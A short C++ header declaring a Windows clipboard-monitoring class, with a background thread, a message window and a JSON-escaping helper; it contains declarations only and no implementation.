#pragma once

#include <windows.h>
#include <string>
#include <atomic>

namespace Jugnu
{
    class ClipboardManager
    {
    public:
        static void Start();
        static void Stop();

    private:
        static std::atomic<bool> isRunning;
        static HANDLE hThread;
        static HWND hMessageWindow;

        static DWORD WINAPI ClipboardThread(LPVOID lpParam);
        static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
        static void ProcessClipboardContent();
        static std::string EscapeJSON(const std::string& input);
    };
}
